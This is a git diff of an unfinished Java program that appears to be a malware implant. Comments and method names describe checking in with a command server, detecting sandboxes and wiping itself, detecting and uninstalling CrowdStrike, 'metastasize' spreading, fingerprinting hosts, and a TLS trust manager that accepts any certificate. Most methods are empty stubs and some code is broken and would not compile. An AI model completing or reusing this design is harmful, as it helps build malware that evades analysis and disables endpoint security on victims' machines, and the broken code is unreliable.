@@ -17,17 +17,24 @@ import javax.xml.transform.dom.DOMSource;
 import javax.xml.transform.*;
 import javax.xml.transform.stream.StreamResult;
 import java.net.UnknownHostException;
+import java.security.KeyManagementException;
+import java.security.NoSuchAlgorithmException;
 
 import javax.crypto.SecretKey;
 
 import javax.net.ssl.HttpsURLConnection;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
 import javax.swing.text.html.HTMLEditorKit.Parser;
 
+import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
+
+import java.security.cert.CertificateException;
+import java.security.cert.X509Certificate;
 
 class nConfig
 {
@@ -35,6 +42,7 @@ class nConfig
     public String encKey = "";
     public int metastasize = 0;
     public String uri = "";
+    public int isKeystone = 0;
     public int stutterMin = 10;
     public int stutterMax = 50;
 }
@@ -44,18 +52,20 @@ public class nCore
     public static void Main(String[] args)
     {
         
-        //convert to thread once main loop has been tested
+        //convert to threadable once main loop has been tested
 
         //check if the program can reach out and if it's in a sandbox
-        if (!keepalive() || countermeasures.chkSandbox())
+        countermeasures cm = new countermeasures();
+
+        if (!keepalive() || cm.chkSandbox())
         {
-            countermeasures.spoliate();
+            cm.spoliate();
         }
 
         //check if crowdstrike is installed and attempt uninstall if it is
-        if (countermeasures.getCStrike())
+        if (cm.getCStrike())
         {
-            countermeasures.counterStrike();
+            cm.counterStrike();
         }
 
         modLib.getUpdate();
@@ -67,6 +77,17 @@ public class nCore
 
     public static boolean keepalive()
     {
+        //5 tries to checkin
+        network nComm = new network();
+        for (int c=0; c<5; c++)
+        try
+        {
+            nComm.request();
+        }
+        catch
+        {
+
+        }
 
     }
 
@@ -86,7 +107,7 @@ public class nCore
 
     //need class getter
 
-    class modLib
+    static class modLib
     {
         public static void getUpdate()
         {
@@ -189,6 +210,7 @@ public class nCore
             return doc;
         }
 
+        //copied from my lycanthropy project
         private String getHostname() throws UnknownHostException {
             String deviceName = new String();
                 try {
@@ -216,6 +238,7 @@ public class nCore
                 return deviceName;
         }
         
+        //copied from my lycanthropy project
         private Hashtable getAddress() throws SocketException {
             Hashtable interfaceMap = new Hashtable();
             Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
@@ -235,25 +258,12 @@ public class nCore
 
     private class network
     {
-        private byte[] request()
+        private byte[] request(String postData) throws NoSuchAlgorithmException, KeyManagementException
         {
+            //stackoverflow provided boilerplate
+            SSLContext sslCon = SSLContext.getInstance("TLS");
+            sslCon.init(null, new TrustManager[] {new CertAutoTruster()}, null);
 
-        }
-
-        private Hashtable kaReq(String data)
-        {
-            //returns formatted data for a keepalive request
-
-        }
-
-        private Hashtable upReq(String data)
-        {
-            //returns formatted data for an upload request
-        }
-
-        private Hashtable dnReq(String data)
-        {
-            //returns formatted data for a download request
         }
 
         private Hashtable auReq(String Data)
@@ -261,22 +271,32 @@ public class nCore
 
         }
 
-        
+        class CertAutoTruster implements X509TrustManager
+        {
+            @Override
+            public X509Certificate[] getAcceptedIssuers() 
+            {
+                return null;
+            }
+
+            @Override
+            public void checkServerTrusted(X509Cet)
+        }
     }
 
     private class security
     {
-        private static byte[] encrypt()
+        private byte[] encrypt()
         {
 
         }
 
-        private static byte[] decrypt()
+        private byte[] decrypt()
         {
 
         }
 
-        private static SecretKey init() throws Exception
+        private SecretKey init() throws Exception
         {
     
         }
@@ -287,24 +307,24 @@ public class nCore
         }
     }
 
-    private class countermeasures
+    private static class countermeasures
     {
-        private static boolean chkSandbox()
+        private boolean chkSandbox()
         {
 
         }
 
-        private static void spoliate()
+        private void spoliate()
         {
 
         }
 
-        private static void counterStrike()
+        private void counterStrike()
         {
 
         }
 
-        private static boolean getCStrike()
+        private boolean getCStrike()
         {
 
         }
